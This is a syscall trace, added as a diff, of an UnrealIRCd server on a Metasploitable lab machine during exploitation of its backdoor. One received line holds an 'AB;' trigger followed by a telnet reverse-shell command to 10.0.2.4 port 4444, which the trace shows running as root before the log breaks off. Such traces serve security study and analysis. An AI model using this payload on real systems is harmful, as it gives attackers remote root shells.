@@ -1,0 +1,1270 @@
+4519  15:04:56.498091 select(1024, [2 3 4 6 9], [], NULL, {0, 770000}) = 1 (in [2], left {0, 670000})
+4519  15:04:56.597370 clock_gettime(CLOCK_MONOTONIC, {29506, 414391884}) = 0
+4519  15:04:56.597391 time(NULL)        = 1495652696
+4519  15:04:56.597402 time(NULL)        = 1495652696
+4519  15:04:56.597414 gettimeofday({1495652696, 597417}, NULL) = 0
+4519  15:04:56.597425 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
+4519  15:04:56.597464 clock_gettime(CLOCK_MONOTONIC, {29506, 414477164}) = 0
+4519  15:04:56.597475 gettimeofday({1495652696, 597478}, NULL) = 0
+4519  15:04:56.597485 select(1024, [2 3 4 6 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
+4519  15:04:56.597523 clock_gettime(CLOCK_MONOTONIC, {29506, 414535849}) = 0
+4519  15:04:56.597535 accept(2, 0, NULL) = 5
+4519  15:04:56.597554 getpeername(5, {sa_family=AF_INET, sin_port=htons(36479), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
+4519  15:04:56.597585 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
+4519  15:04:56.597661 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+4519  15:04:56.597689 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+4519  15:04:56.597737 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
+4519  15:04:56.597762 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
+4519  15:04:56.597773 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
+4519  15:04:56.597788 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
+4519  15:04:56.597804 clock_gettime(CLOCK_MONOTONIC, {29506, 414817658}) = 0
+4519  15:04:56.597816 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 7
+4519  15:04:56.597828 fcntl64(7, F_GETFL) = 0x2 (flags O_RDWR)
+4519  15:04:56.597837 fcntl64(7, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+4519  15:04:56.597847 fcntl64(7, F_SETFD, FD_CLOEXEC) = 0
+4519  15:04:56.597857 connect(7, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
+4519  15:04:56.597872 send(7, "\332A\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
+4519  15:04:56.597928 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
+4519  15:04:56.597984 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
+4519  15:04:56.598064 gettimeofday({1495652696, 598069}, NULL) = 0
+4519  15:04:56.598115 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [7], left {1, 0})
+4519  15:04:56.603802 clock_gettime(CLOCK_MONOTONIC, {29506, 420821757}) = 0
+4519  15:04:56.603835 recvfrom(7, "\332A\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0i\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
+4519  15:04:56.603910 close(7)          = 0
+4519  15:04:56.603925 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
+4519  15:04:56.603939 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
+4519  15:04:56.603990 time(NULL)        = 1495652696
+4519  15:04:56.604023 time(NULL)        = 1495652696
+4519  15:04:56.604048 gettimeofday({1495652696, 604052}, NULL) = 0
+4519  15:04:56.604060 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+4519  15:04:56.604088 clock_gettime(CLOCK_MONOTONIC, {29506, 421101202}) = 0
+4519  15:04:56.604099 gettimeofday({1495652696, 604102}, NULL) = 0
+4519  15:04:56.604109 select(1024, [2 3 4 5 6 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
+4519  15:04:56.604148 clock_gettime(CLOCK_MONOTONIC, {29506, 421160756}) = 0
+4519  15:04:56.604159 recv(5, "AB;sh -c \'(sleep 4172|telnet 10.0.2.4 4444|while : ; do sh && break; done 2>&1|telnet 10.0.2.4 4444 >/dev/null 2>&1 &)\'\n", 8192, 0) = 120
+4519  15:04:56.604179 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
+4519  15:04:56.604199 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+4519  15:04:56.604239 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+4519  15:04:56.604287 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 29839
+29839 15:04:56.604385 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
+29839 15:04:56.604400 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
+29839 15:04:56.604411 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.604424 execve("/bin/sh", ["sh", "-c", "AB;sh -c \'(sleep 4172|telnet 10.0.2.4 4444|while : ; do sh && break; done 2>&1|telnet 10.0.2.4 4444 >/dev/null 2>&1 &)\'\n"], [/* 14 vars */]) = 0
+29839 15:04:56.604546 brk(0)            = 0x80f9000
+29839 15:04:56.604570 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.604586 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f04000
+29839 15:04:56.604603 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.604620 open("/etc/ld.so.cache", O_RDONLY) = 1
+29839 15:04:56.604633 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29839 15:04:56.604652 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efc000
+29839 15:04:56.604662 close(1)          = 0
+29839 15:04:56.604673 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.604689 open("/lib/libncurses.so.5", O_RDONLY) = 1
+29839 15:04:56.604702 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
+29839 15:04:56.604709 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+29839 15:04:56.604716 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ecc000
+29839 15:04:56.604729 mmap2(0xb7ef9000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7ef9000
+29839 15:04:56.604747 close(1)          = 0
+29839 15:04:56.604759 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.604774 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
+29839 15:04:56.604788 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
+29839 15:04:56.604879 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+29839 15:04:56.604901 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec8000
+29839 15:04:56.604913 mmap2(0xb7eca000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7eca000
+29839 15:04:56.604929 close(1)          = 0
+29839 15:04:56.604940 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.604954 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
+29839 15:04:56.604968 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
+29839 15:04:56.605103 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+29839 15:04:56.605120 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ec7000
+29839 15:04:56.605135 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d78000
+29839 15:04:56.605146 mmap2(0xb7ec1000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ec1000
+29839 15:04:56.605161 mmap2(0xb7ec4000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec4000
+29839 15:04:56.605176 close(1)          = 0
+29839 15:04:56.605200 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d77000
+29839 15:04:56.605213 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d776b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+29839 15:04:56.605268 mprotect(0xb7ec1000, 4096, PROT_READ) = 0
+29839 15:04:56.605307 munmap(0xb7efc000, 29913) = 0
+29839 15:04:56.605333 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29839 15:04:56.605348 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+29839 15:04:56.605368 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2ef70) = -1 ENOTTY (Inappropriate ioctl for device)
+29839 15:04:56.605399 brk(0)            = 0x80f9000
+29839 15:04:56.605409 brk(0x80fa000)    = 0x80fa000
+29839 15:04:56.605421 brk(0x80fb000)    = 0x80fb000
+29839 15:04:56.605437 getuid32()        = 0
+29839 15:04:56.605447 getgid32()        = 0
+29839 15:04:56.605456 geteuid32()       = 0
+29839 15:04:56.605465 getegid32()       = 0
+29839 15:04:56.605480 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29839 15:04:56.605493 time(NULL)        = 1495652696
+29839 15:04:56.605506 brk(0x80fc000)    = 0x80fc000
+29839 15:04:56.605531 brk(0x80fd000)    = 0x80fd000
+29839 15:04:56.605554 open("/proc/meminfo", O_RDONLY) = 1
+29839 15:04:56.605576 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+29839 15:04:56.605594 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f03000
+29839 15:04:56.605606 read(1, "MemTotal:      1035240 kB\nMemFree:         52912 kB\nBuffers:        114564 kB\nCached:         392900 kB\nSwapCached:          0 kB\nActive:         438268 kB\nInactive:       400904 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:         52664 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            2264 kB\nWriteback:           0 kB\nAnonPages:      331748 kB\nMapped:          52112 kB\nSlab:            83476 kB\nSReclaimable:    21672 kB\nSUnreclaim:      61804 kB\nPageTables:      25280 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:  1110120 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
+29839 15:04:56.605694 close(1)          = 0
+29839 15:04:56.605706 munmap(0xb7f03000, 4096) = 0
+29839 15:04:56.605718 brk(0x80fe000)    = 0x80fe000
+29839 15:04:56.605744 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29839 15:04:56.605757 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29839 15:04:56.605769 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29839 15:04:56.605781 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29839 15:04:56.605793 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+29839 15:04:56.605805 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29839 15:04:56.605819 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29839 15:04:56.605830 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29839 15:04:56.605843 uname({sys="Linux", node="metasploitable", ...}) = 0
+29839 15:04:56.605893 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+29839 15:04:56.605911 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29839 15:04:56.605929 brk(0x8100000)    = 0x8100000
+29839 15:04:56.605942 getcwd("/etc/unreal", 4096) = 12
+29839 15:04:56.605956 getpid()          = 29839
+29839 15:04:56.605973 getppid()         = 4519
+29839 15:04:56.605988 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29839 15:04:56.606009 stat64("/sbin/sh", 0xbfd2ef48) = -1 ENOENT (No such file or directory)
+29839 15:04:56.606071 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29839 15:04:56.606089 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+29839 15:04:56.606114 socket(PF_FILE, SOCK_STREAM, 0) = 1
+29839 15:04:56.606127 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+29839 15:04:56.606139 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+29839 15:04:56.606160 close(1)          = 0
+29839 15:04:56.606172 socket(PF_FILE, SOCK_STREAM, 0) = 1
+29839 15:04:56.606182 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+29839 15:04:56.606193 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+29839 15:04:56.606211 close(1)          = 0
+29839 15:04:56.606224 open("/etc/nsswitch.conf", O_RDONLY) = 1
+29839 15:04:56.606239 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+29839 15:04:56.606255 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f03000
+29839 15:04:56.606267 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
+29839 15:04:56.606316 read(1, "", 4096) = 0
+29839 15:04:56.606326 close(1)          = 0
+29839 15:04:56.606336 munmap(0xb7f03000, 4096) = 0
+29839 15:04:56.606352 open("/etc/ld.so.cache", O_RDONLY) = 1
+29839 15:04:56.606365 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29839 15:04:56.606382 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efc000
+29839 15:04:56.606392 close(1)          = 0
+29839 15:04:56.606403 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.606417 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
+29839 15:04:56.606436 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
+29839 15:04:56.606537 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+29839 15:04:56.606556 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d6e000
+29839 15:04:56.606568 mmap2(0xb7d75000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d75000
+29839 15:04:56.606586 close(1)          = 0
+29839 15:04:56.606598 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.606612 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
+29839 15:04:56.606626 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
+29839 15:04:56.606714 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+29839 15:04:56.606731 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d56000
+29839 15:04:56.606743 mmap2(0xb7d6a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d6a000
+29839 15:04:56.606760 mmap2(0xb7d6c000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d6c000
+29839 15:04:56.606775 close(1)          = 0
+29839 15:04:56.606802 munmap(0xb7efc000, 29913) = 0
+29839 15:04:56.606820 open("/etc/ld.so.cache", O_RDONLY) = 1
+29839 15:04:56.606832 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29839 15:04:56.606848 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efc000
+29839 15:04:56.606858 close(1)          = 0
+29839 15:04:56.606869 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29839 15:04:56.606883 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
+29839 15:04:56.606898 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 